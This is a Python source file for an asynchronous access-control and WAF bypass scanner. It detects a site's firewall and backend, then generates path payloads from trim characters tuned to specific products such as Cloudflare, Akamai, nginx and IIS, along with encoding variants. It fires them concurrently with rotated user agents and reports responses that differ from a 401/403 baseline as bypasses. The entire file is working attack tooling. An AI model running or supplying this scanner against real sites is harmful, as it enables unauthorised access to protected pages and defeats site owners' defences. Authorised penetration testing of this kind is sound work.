import asyncio
import logging
import random
import re
import hashlib
from typing import List, Dict, Optional, Any, Mapping, Tuple
from urllib.parse import quote

logger = logging.getLogger(__name__)

class TrimInconsistencyEngine:
    def __init__(self, waf_detector, backend_identifier, *, max_payloads: int = 220, max_concurrency: int = 12):
        self.waf_detector = waf_detector
        self.backend_identifier = backend_identifier
        self.max_payloads = max_payloads
        self.max_concurrency = max_concurrency
        self._baseline: Optional[Dict[str, Any]] = None
        self.user_agents: List[Tuple[str, str]] = [
            ("desktop-chrome",
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
             "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"),
            ("desktop-firefox",
             "Mozilla/5.0 (X11; Linux x86_64; rv:122.0) Gecko/20100101 Firefox/122.0"),
            ("desktop-safari",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
             "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15"),
        ]

    async def generate_payloads(self, target_url: str, base_path: str, http_client) -> List[str]:
        base_path = self._normalize_base_path(base_path)
        try:
            waf_results = await self.waf_detector.detect(target_url, http_client)
        except TypeError:
            waf_results = await self.waf_detector.detect(target_url, http_client)

        try:
            backend_results = await self.backend_identifier.identify(target_url, http_client)
        except TypeError:
            backend_results = await self.backend_identifier.identify(target_url, http_client)

        waf_key = self._choose_waf_key(waf_results)
        backend_key = self._choose_backend_key(backend_results)
        trim_chars = self._get_trim_characters(backend_key, waf_key)
        logger.debug(f"[TrimGen] Using {len(trim_chars)} trim chars for backend='{backend_key}' waf='{waf_key}'")
        payloads: List[str] = []
        seen: set = set()

        def _add(p: str):
            if p not in seen:
                seen.add(p)
                payloads.append(p)

        for ch in trim_chars:
            _add(f"{base_path}{ch}")

        for ch in trim_chars:
            _add(f"{ch}{base_path}")

        for ch in trim_chars:
            _add(f"{base_path}{ch}bypass")

        parts = [p for p in base_path.split("/") if p]
        if parts:
            last = parts[-1]
            for ch in trim_chars:
                _add(base_path.replace(f"/{last}", f"/{last}{ch}"))
                _add(base_path.replace(f"/{last}", f"/{ch}{last}"))

        more: List[str] = []
        for p in payloads:
            more.extend(self._percent_case_variants(p))
        for p in more:
            _add(p)

        for p in list(payloads):
            _add(self._double_encode_percent(p))

        if len(payloads) > self.max_payloads:
            payloads = self._stable_cap(payloads, self.max_payloads)

        return payloads

    async def test_payloads(self, target_url: str, base_path: str, payloads: List[str], http_client) -> List[Dict[str, Any]]:
        base_path = self._normalize_base_path(base_path)
        results: List[Dict[str, Any]] = []

        baseline_url = f"{target_url.rstrip('/')}{base_path}"
        self._baseline = await self._get_snapshot(http_client, baseline_url)
        sem = asyncio.Semaphore(self.max_concurrency)
        async def run_one(payload: str) -> Optional[Dict[str, Any]]:
            test_url = f"{target_url.rstrip('/')}{payload}"
            try:
                async with sem:
                    snap = await self._get_snapshot(http_client, test_url)
                if not snap:
                    return None

                if self._is_valid_bypass(snap, self._baseline):
                    return {
                        "payload": payload,
                        "url": test_url,
                        "status_code": snap["status"],
                        "response_size": len(snap["body"]),
                        "technique": "trim_inconsistency",
                        "proof": {
                            "cookie_fp": snap["cookie_fp"],
                            "body_len": len(snap["body"]),
                            "body_md5": snap["body_md5"],
                            "headers_sample": dict(list(snap["headers"].items())[:6]),
                        },
                    }
                else:
                    if snap["status"] not in (400, 401, 403, 404):
                        logger.debug(f"[TrimTest] Interesting {snap['status']} for payload: {payload}")
            except Exception as e:
                logger.debug(f"[TrimTest] Error for {test_url}: {e}")
            return None

        tasks = [asyncio.create_task(run_one(p)) for p in payloads]
        for res in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(res, Exception):
                logger.debug(f"[TrimTest] Task error: {res}")
                continue
            if res:
                results.append(res)
                logger.info(f"[Trim] Bypass found: {res['payload']} -> {res['status_code']}")

        return results

    def _get_trim_characters(self, backend: str, waf: str) -> List[str]:
        """
        Choose trim characters by backend/WAF (loose matching), else fall back to universal.
        """
        backend_chars = {
            "nginx": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c'],
            "apache": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c', '%25'],
            "iis": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c', '%5f'],
            "node.js": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c', '%3b'],
            "flask": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c', '%2a'],
            "spring": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c', '%3f'],
        }
        waf_chars = {
            "cloudflare": ['%a0', '%85', '%1f', '%1e', '%1d', '%1c', '%c2%a0'],
            "aws": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c', '%ff'],
            "akamai": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c', '%25'],
            "imperva": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c', '%25'],
            "f5": ['%09', '%0a', '%0d', '%00', '%20', '%2e', '%2f', '%5c'],
        }

        chars = set()

        b = backend.lower()
        if "nginx" in b:
            chars.update(backend_chars["nginx"])
        elif "apache" in b:
            chars.update(backend_chars["apache"])
        elif "iis" in b:
            chars.update(backend_chars["iis"])
        elif "node" in b or "express" in b:
            chars.update(backend_chars["node.js"])
        elif "flask" in b or "werkzeug" in b:
            chars.update(backend_chars["flask"])
        elif "spring" in b:
            chars.update(backend_chars["spring"])

        w = waf.lower()
        if "cloudflare" in w:
            chars.update(waf_chars["cloudflare"])
        elif "akamai" in w:
            chars.update(waf_chars["akamai"])
        elif "imperva" in w:
            chars.update(waf_chars["imperva"])
        elif "aws" in w or "waf" in w:
            chars.update(waf_chars["aws"])
        elif "f5" in w or "big-ip" in w:
            chars.update(waf_chars["f5"])

        if not chars:
            chars.update(self._get_universal_trim_chars())

        return sorted({c.lower() for c in chars})

    def _get_universal_trim_chars(self) -> List[str]:
        return [
            '%09', 
            '%0a',  
            '%0d',  
            '%0c', 
            '%a0',  
            '%85', 
            '%1f', '%1e', '%1d', '%1c',  
            '%20',  
            '%2e',  
            '%2f',  
            '%5c', 
            '%00', 
            '%ff',  
            '%c2%a0',  
        ]

    def _is_valid_bypass(self, snap: Dict[str, Any], baseline: Optional[Dict[str, Any]]) -> bool:
        status = snap["status"]
        body = snap["body"].lower() if isinstance(snap["body"], str) else ""

        if not (200 <= status < 300):
            return False

        block_indicators = ["access denied", "forbidden", "unauthorized", "blocked", "not authorized", "captcha"]
        if any(b in body for b in block_indicators):
            return False

        if baseline:
            b_status = baseline["status"]
            b_body = baseline["body"]
            if b_status in (401, 403, 404):
                if snap["cookie_fp"] != baseline["cookie_fp"]:
                    return True
                if abs(len(b_body) - len(snap["body"])) > max(64, int(0.15 * max(len(b_body), len(snap["body"])))):
                    return True
                return snap["body_md5"] != baseline["body_md5"]

            same_len_ratio = min(len(b_body), len(snap["body"])) / max(1, max(len(b_body), len(snap["body"])))
            if same_len_ratio > 0.95 and snap["body_md5"] == baseline["body_md5"]:
                return False
            if snap["cookie_fp"] != baseline["cookie_fp"]:
                return True
            if abs(len(b_body) - len(snap["body"])) > max(64, int(0.10 * max(len(b_body), len(snap["body"])))):
                return True
            return False

        return True

    async def _get_snapshot(self, http_client, url: str) -> Optional[Dict[str, Any]]:
        try:
            ua = random.choice(self.user_agents)[1]
            resp = await self._safe_get(http_client, url, headers={"User-Agent": ua}, timeout=12)
            if not resp:
                return None
            status, headers, body = await self._normalize_response(resp)
            h = self._lower_headers(headers)
            body_s = body if isinstance(body, str) else ""
            return {
                "status": status,
                "headers": h,
                "body": body_s,
                "body_md5": hashlib.md5(body_s.encode("utf-8", errors="ignore")).hexdigest(),
                "cookie_fp": self._cookie_fingerprint(h.get("set-cookie", "")),
            }
        except Exception as e:
            logger.debug(f"[Snapshot] failed for {url}: {e}")
            return None

    async def _safe_get(self, http_client, url: str, headers: Optional[Dict[str, str]] = None, timeout: int = 12):
        try:
            return await http_client.get(url, headers=headers or {}, timeout=timeout, follow_redirects=True)
        except TypeError:
            try:
                return await http_client.get(url, headers=headers or {}, timeout=timeout)
            except Exception as e:
                logger.debug(f"_safe_get failed for {url}: {e}")
                return None
        except Exception as e:
            logger.debug(f"_safe_get failed for {url}: {e}")
            return None

    async def _normalize_response(self, resp) -> Tuple[int, Mapping[str, str], str]:
        status = getattr(resp, "status_code", None)
        if status is None:
            status = getattr(resp, "status", None)
        if status is None:
            status = 0

        headers = getattr(resp, "headers", {}) or {}
        text_val = getattr(resp, "text", None)
        if isinstance(text_val, str):
            body = text_val
        else:
            body = ""
            try:
                if callable(text_val):
                    maybe = text_val()
                    if asyncio.iscoroutine(maybe):
                        body = await maybe
                    else:
                        body = str(maybe) if maybe is not None else ""
            except Exception:
                body = ""
        return int(status), headers, body

    def _normalize_base_path(self, base_path: str) -> str:
        base_path = base_path.strip() or "/"
        if not base_path.startswith("/"):
            base_path = "/" + base_path
        return base_path

    def _choose_waf_key(self, waf_results: Dict[str, float]) -> str:
        if not waf_results:
            return "unknown"
        best = max(waf_results.items(), key=lambda x: x[1])[0]
        b = best.lower()
        for k in ("cloudflare", "akamai", "imperva", "aws", "waf", "f5", "big-ip"):
            if k in b:
                return k
        return best

    def _choose_backend_key(self, backend_results: Dict[str, Dict[str, Any]]) -> str:
        if not backend_results:
            return "unknown"
        best = max(backend_results.items(), key=lambda x: x[1].get("confidence", 0.0))[0]
        return best

    def _percent_case_variants(self, s: str) -> List[str]:
        out = set([s])
        for m in re.finditer(r"%[0-9a-fA-F]{2}", s):
            i, j = m.span()
            head, enc, tail = s[:i], s[i:j], s[j:]
            out.add(head + enc.upper() + tail)
            out.add(head + enc.lower() + tail)
        return list(out)

    def _double_encode_percent(self, s: str) -> str:
        return s.replace("%", "%25")

    def _stable_cap(self, items: List[str], k: int) -> List[str]:
        scored = [(hashlib.sha1(i.encode("utf-8")).hexdigest(), i) for i in items]
        scored.sort(key=lambda x: x[0])
        return [i for _, i in scored[:k]]

    def _lower_headers(self, h: Mapping[str, str]) -> Dict[str, str]:
        try:
            return {str(k).lower(): str(v) for k, v in dict(h).items()}
        except Exception:
            out: Dict[str, str] = {}
            try:
                for k in h.keys(): 
                    out[str(k).lower()] = str(h.get(k))
            except Exception:
                pass
            return out

    def _cookie_fingerprint(self, set_cookie_val: str) -> str:
        sc = set_cookie_val or ""
        if not sc:
            return "none"
        parts = [p.strip() for p in re.split(r",(?=[^ ;]+=)", sc)]
        names = []
        for p in parts:
            name = p.split("=", 1)[0].strip().lower()
            attrs = set()
            for a in ("httponly", "secure", "samesite", "path", "domain", "max-age"):
                if re.search(rf"\b{a}\b", p, re.I):
                    attrs.add(a)
            names.append(f"{name};{'|'.join(sorted(attrs))}")
        names.sort()
        return hashlib.sha1(";".join(names).encode("utf-8")).hexdigest()
